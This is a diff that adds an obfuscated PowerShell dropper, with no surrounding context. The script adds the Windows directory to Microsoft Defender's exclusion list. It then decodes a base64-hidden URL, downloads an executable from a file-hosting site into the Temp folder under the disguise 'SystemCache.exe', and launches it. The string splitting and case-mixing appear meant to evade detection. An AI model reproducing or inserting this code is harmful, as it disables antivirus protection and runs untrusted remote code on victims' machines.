@@ -1,0 +1,11 @@
+$a = 'Add' + '-Mp' + 'Preference'
+$b = 'Exclusion' + 'Path'
+$c = "$env:W"+"indows"
+&$a -$b $c
+
+$d = ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly93d3cudXBsb2FkLmVlL2Rvd25sb2FkLzE4MTg1MDQ0LzQ0MzQ5OWM1YTZjNzIwY2FiNjIyL3ZtLmV4ZQ==")))
+$e = "$env:Temp" + "\SystemCache.exe"
+
+(NeW-ObJeCT NeT.WEbCliENt).dOwNlOaDfiLe($d, $e)
+
+&("St"+"aRt-Pr"+"Oc"+"e"+"ss") $e
